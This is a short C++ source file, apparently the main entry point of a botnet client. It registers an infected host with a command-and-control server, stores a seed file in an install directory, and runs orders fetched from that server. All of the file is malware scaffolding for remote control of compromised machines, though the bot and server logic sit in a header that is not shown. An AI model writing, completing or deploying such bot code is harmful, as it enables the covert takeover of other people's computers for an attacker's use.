#include <iostream>
#include <fstream>
#include <string>
#include <stdio.h>
#include <iostream>
#include "aura.hh"

int main()
{
	std::string registerUrl, cmdUrl, seedPath;

	registerUrl = C2_SERVER + REGISTER_URI;
	cmdUrl = C2_SERVER + CMD_URI;
	seedPath = util::getInstallDir() + SEED_FILE;

	C2Server server(registerUrl, cmdUrl);
	Bot host(seedPath, &server);

    if (host.isInit()) {
        host.executeOrder();
    } else {
        host.init();
    }

    return 0;
}
